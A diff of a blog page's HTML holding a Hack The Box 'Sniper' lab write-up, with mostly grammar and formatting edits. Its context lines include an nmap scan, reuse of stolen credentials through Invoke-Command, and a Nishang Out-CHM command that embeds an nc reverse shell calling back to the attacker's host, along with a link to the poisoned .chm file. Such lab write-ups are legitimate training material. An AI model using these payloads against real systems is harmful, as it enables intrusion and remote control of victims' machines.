@@ -70,17 +70,17 @@ Hi there, I am a nerd guy who loves everything in between Internet and Security 
   
   <h2 id="htbsniper">HTB:Sniper</h2>
 
-<p>Sniper box is easy box. It falls under windows and medium category. Here, everything was all about enumeration and webshell upload. I’ll approach this write-up how I solved it, along with the problems that I had to face during this box. At first I obtained the user flag by exploiting RFI using SMB and I got the unprivelege user shell to privelege by using powershell commands and with .chm exploit I got root.txt. I’ll show all my payload (including that didn’t work in initial deployment to get root).</p>
+<p>Sniper box was easy box. It falls under windows and medium category. Here, everything was all about enumeration and webshell upload. I’ll approach this write-up how I solved it, along with the problems that I had to face during this box. At first I obtained the user flag by exploiting RFI using SMB and I got the unprivelege user shell to privelege by using powershell commands and with .chm exploit I got root.txt. I’ll show all my payload (including that didn’t work in initial deployment to get root).</p>
 
 <h2 id="box-details">Box Details</h2>
 
 <p><img src="/public/images/sniperdetail.png" alt="box_detail" /></p>
 
-<p>In the above it’s ip is <code class="highlighter-rouge">10.10.14.151</code> ,I added it to <code class="highlighter-rouge">/etc/hosts</code> as sniper.htb. Let’s solve this box.</p>
+<p>In the above it’s ip was <code class="highlighter-rouge">10.10.14.151</code>, I added it to <code class="highlighter-rouge">/etc/hosts</code> as sniper.htb. Let’s solve this box.</p>
 
 <h2 id="recon">Recon</h2>
 
-<p>Let’s start with universal port scanner, <code class="highlighter-rouge">nmap</code> to see the open port and service which shows <code class="highlighter-rouge">port 80</code> and <code class="highlighter-rouge">smb</code> service</p>
+<p>Let’s start with universal port scanner, <code class="highlighter-rouge">nmap</code> to see the open port and service which shows <code class="highlighter-rouge">port 80</code> and <code class="highlighter-rouge">smb</code> service.</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.80 scan initiated Fri Mar 27 21:34:08 2020 as: nmap -sS -sC -sV -Pn -oA nmap.txt 10.10.10.151
 Nmap scan report for sniper.htb (10.10.10.151)
 Host is up (0.41s latency).
@@ -108,8 +108,9 @@ Service detection performed. Please report any incorrect results at https://nmap
 </code></pre></div></div>
 
 <h3 id="web-enumeration">Web Enumeration</h3>
-<p>sniper.htb
-After I noticed port <code class="highlighter-rouge">80</code> is opened I visited that site and got this as output.</p>
+<p>sniper.htb</p>
+
+<p>After I noticed port <code class="highlighter-rouge">80</code> was opened I visited that site and got this as output.</p>
 
 <p><img src="/public/images/sniper_htb.jpg" alt="sniperhtb" /></p>
 
@@ -160,7 +161,7 @@ Copyright (C) Microsoft Corporation. All rights reserved.
 PS C:\gr4n173&gt; 
 </code></pre></div></div>
 
-<p>Then I found the <code class="highlighter-rouge">Chris</code> user. Since I m in unprivelege I wasn’t given any permission.</p>
+<p>Then I found the <code class="highlighter-rouge">Chris</code> user. Since I m unprivelege user so no any permission was granted.</p>
 
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Users&gt; ls
 ls
@@ -188,7 +189,7 @@ more db.php
   <span class="p">}</span>
 <span class="cp">?&gt;</span>
 </code></pre></div></div>
-<p>By combining creds and <code class="highlighter-rouge">Invoke-Command</code> I got the user shell. Before that I created the folder <code class="highlighter-rouge">files</code> and downloaded the <code class="highlighter-rouge">nc</code> tool inside. Since it’s2020 as python2 died so I used python3 server as</p>
+<p>By combining creds and <code class="highlighter-rouge">Invoke-Command</code> I got the user shell. Before that I created the folder <code class="highlighter-rouge">files</code> and downloaded the <code class="highlighter-rouge">nc</code> tool inside. Since it’s 2020 as python2 died so I used python3 server as</p>
 
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\gr4n173&gt; cd files
 cd files
@@ -213,7 +214,7 @@ PS C:\gr4n173\files&gt; Invoke-Command -Computer Sniper -ScriptBlock { whoami } 
 Invoke-Command -Computer Sniper -ScriptBlock { whoami } -Credential $cred 
 sniper\chris
 </code></pre></div></div>
-<p>From above command, at first I defined a variable <code class="highlighter-rouge">$pass</code> which store the password and another variable <code class="highlighter-rouge">cred</code> for passing the <code class="highlighter-rouge">user</code> and <code class="highlighter-rouge">pass</code> to <code class="highlighter-rouge">Powershell</code> and final command give the output of <code class="highlighter-rouge">whoami</code> after passing the two variable to <code class="highlighter-rouge">Powershell</code>. This indicate I can run the <code class="highlighter-rouge">command</code> .</p>
+<p>In above command, at first I defined a variable <code class="highlighter-rouge">$pass</code> which store the password and another variable <code class="highlighter-rouge">cred</code> for passing the <code class="highlighter-rouge">user</code> and <code class="highlighter-rouge">pass</code> to <code class="highlighter-rouge">Powershell</code> and last one gaves the output of command <code class="highlighter-rouge">whoami</code> in <code class="highlighter-rouge">Powershell</code>. Hence I can run the <code class="highlighter-rouge">command</code> .</p>
 
 <h2 id="reverse-shell">Reverse shell</h2>
 
@@ -234,7 +235,7 @@ PS C:\Users\Chris\Documents&gt; hostname
 hostname
 Sniper
 </code></pre></div></div>
-<p>This way finally I got the user.</p>
+<p>This way I got the user.</p>
 
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Users\Chris\Desktop&gt; ls
 ls
@@ -254,7 +255,7 @@ more user.txt
 <hr />
 <h2 id="user-to-root">User to Root</h2>
 
-<p>For root I searched every part of the user shell and got the uncomplete <code class="highlighter-rouge">.chm</code> file inside Chris’s Downloads:</p>
+<p>For root I searched every part of the user shell and uncomplete <code class="highlighter-rouge">.chm</code> file was found inside Chris’s Downloads directory:</p>
 
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Users\Chris\Downloads&gt; ls
 ls
@@ -268,7 +269,7 @@ Mode                LastWriteTime         Length Name
 
 <h3 id="poisoning-chm">Poisoning .chm</h3>
 
-<p>Now to posioion I used <code class="highlighter-rouge">Out-CHM.ps1</code> while  from <a href="https://github.com/samratashok/nishang">Nishang</a> which is quite Interesting git repo especially related to window.</p>
+<p>In order to poison, I used <code class="highlighter-rouge">Out-CHM.ps1</code> while  from <a href="https://github.com/samratashok/nishang">Nishang</a> which is quite Interesting git repo especially related to window.</p>
 
 <p>I used nishand tool and opened it in powershell.</p>
 
@@ -285,7 +286,7 @@ Mode                LastWriteTime         Length Name
 10.10.14.11 8888 -e powershell" -HHCPath "C:\Program Files (x86)\HTML
 Help Workshop" 
 </code></pre></div></div>
-<p>Here, I defined the dir of <code class="highlighter-rouge">nc64.exe</code> and used <a href="https://gist.github.com/mgeeky/cce31c8602a144d8f2172a73d510e0e7">this</a> to exploit. File named <code class="highlighter-rouge">doc.chm</code> created and you can get here <a href="/public/files/doc.chm">file</a>.This way I created the poison of <code class="highlighter-rouge">.chm</code> file</p>
+<p>Here, I defined the dir of <code class="highlighter-rouge">nc64.exe</code> and used <a href="https://gist.github.com/mgeeky/cce31c8602a144d8f2172a73d510e0e7">this</a> to exploit. File name <code class="highlighter-rouge">doc.chm</code> was created and you can get here <a href="/public/files/doc.chm">file</a>. This way I created the poison of <code class="highlighter-rouge">.chm</code> file.</p>
 
 <p>Now I downloaded the created file to user shell <code class="highlighter-rouge">Chris</code> with a listener on along with the <code class="highlighter-rouge">python3 server</code> in <code class="highlighter-rouge">/var/www/html/pub</code></p>
 
@@ -311,9 +312,11 @@ PS C:\Users\Administrator\Desktop&gt; more root.txt
 
 <p>This way I got the root of Sniper box and learned alot from this box. So I would like to thank creators of this box <code class="highlighter-rouge">MinatoTW &amp; felamos</code> for such an awesome box. Especially poisoning <code class="highlighter-rouge">.chm</code> was awesome.</p>
 
-<p>I will be posting writeup of next box after box retired. I would like to Thank readers for being with me through out this writeup. 
-Feedback are really appreciated !!
-Tweet about this writeup if you like.</p>
+<p>I will be posting writeup of next box after box retired. I would like to Thank readers for being with me through out this writeup.</p>
+
+<p>Feedback are really appreciated !!</p>
+
+<p>Tweet about this writeup if you like.</p>
 
 <p>You can see more blog at my medium here: <a href="https://medium.com/@gr4n173">gr4n173</a>.</p>
 
@@ -347,6 +350,14 @@ Tweet about this writeup if you like.</p>
     
       <li>
         <h3>
+          <a href="/2020/04/04/htb-registry.html">
+          Hack The Box: Registry
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
           <a href="/2020/03/22/oauth-2.html">
           OAuth 2
           </a>
@@ -361,14 +372,6 @@ Tweet about this writeup if you like.</p>
         </h3>
       </li>
     
-      <li>
-        <h3>
-          <a href="/2020/02/29/htb-scavenger.html">
-          Hack The Box: Scavenger
-          </a>
-        </h3>
-      </li>
-    
   </ul>
 </div>
 
@@ -377,7 +380,7 @@ Tweet about this writeup if you like.</p>
 
   
   <h2>all tags</h2>
-  <div class="tag-cloud"><a href="/tag/.chm/" class="set-1">.chm</a> <a href="/tag/invoke/" class="set-1">Invoke</a> <a href="/tag/powershell/" class="set-1">Powershell</a> <a href="/tag/re/" class="set-1">RE</a> <a href="/tag/smb/" class="set-1">SMB</a> <a href="/tag/binaryexploitation/" class="set-1">binaryexploitation</a> <a href="/tag/ctf/" class="set-1">ctf</a> <a href="/tag/ffuf/" class="set-1">ffuf</a> <a href="/tag/ftp/" class="set-3">ftp</a> <a href="/tag/fuzz/" class="set-1">fuzz</a> <a href="/tag/gdb/" class="set-1">gdb</a> <a href="/tag/htb/" class="set-5">htb</a> <a href="/tag/introduction/" class="set-1">introduction</a> <a href="/tag/ipv6/" class="set-1">ipv6</a> <a href="/tag/linux/" class="set-5">linux</a> <a href="/tag/lkm/" class="set-1">lkm</a> <a href="/tag/nc.exe/" class="set-1">nc.exe</a> <a href="/tag/nephack3/" class="set-1">nephack3</a> <a href="/tag/nishang/" class="set-1">nishang</a> <a href="/tag/oauth2/" class="set-1">oauth2</a> <a href="/tag/pcap/" class="set-1">pcap</a> <a href="/tag/postgres/" class="set-1">postgres</a> <a href="/tag/pwnables/" class="set-1">pwnables</a> <a href="/tag/rce/" class="set-1">rce</a> <a href="/tag/rsync/" class="set-1">rsync</a> <a href="/tag/server/" class="set-1">server</a> <a href="/tag/sqli/" class="set-3">sqli</a> <a href="/tag/webshell/" class="set-1">webshell</a> <a href="/tag/welcome/" class="set-1">welcome</a> <a href="/tag/whois/" class="set-1">whois</a> <a href="/tag/windows/" class="set-1">windows</a></div>
+  <div class="tag-cloud"><a href="/tag/.chm/" class="set-1">.chm</a> <a href="/tag/invoke/" class="set-1">Invoke</a> <a href="/tag/powershell/" class="set-1">Powershell</a> <a href="/tag/re/" class="set-1">RE</a> <a href="/tag/smb/" class="set-1">SMB</a> <a href="/tag/binaryexploitation/" class="set-1">binaryexploitation</a> <a href="/tag/boltcms/" class="set-1">boltcms</a> <a href="/tag/csrftorce/" class="set-1">csrftorce</a> <a href="/tag/ctf/" class="set-1">ctf</a> <a href="/tag/ffuf/" class="set-1">ffuf</a> <a href="/tag/ftp/" class="set-2">ftp</a> <a href="/tag/fuzz/" class="set-1">fuzz</a> <a href="/tag/gdb/" class="set-1">gdb</a> <a href="/tag/htb/" class="set-5">htb</a> <a href="/tag/introduction/" class="set-1">introduction</a> <a href="/tag/ipv6/" class="set-1">ipv6</a> <a href="/tag/linux/" class="set-4">linux</a> <a href="/tag/linxu/" class="set-1">linxu</a> <a href="/tag/lkm/" class="set-1">lkm</a> <a href="/tag/nc.exe/" class="set-1">nc.exe</a> <a href="/tag/nephack3/" class="set-1">nephack3</a> <a href="/tag/nishang/" class="set-1">nishang</a> <a href="/tag/oauth2/" class="set-1">oauth2</a> <a href="/tag/pcap/" class="set-1">pcap</a> <a href="/tag/port-forward/" class="set-1">port-forward</a> <a href="/tag/postgres/" class="set-1">postgres</a> <a href="/tag/pwnables/" class="set-1">pwnables</a> <a href="/tag/rce/" class="set-1">rce</a> <a href="/tag/restic-server/" class="set-1">restic-server</a> <a href="/tag/rsync/" class="set-1">rsync</a> <a href="/tag/server/" class="set-1">server</a> <a href="/tag/sqli/" class="set-2">sqli</a> <a href="/tag/webshell/" class="set-1">webshell</a> <a href="/tag/welcome/" class="set-1">welcome</a> <a href="/tag/whois/" class="set-1">whois</a> <a href="/tag/windows/" class="set-1">windows</a></div>
   
 
 
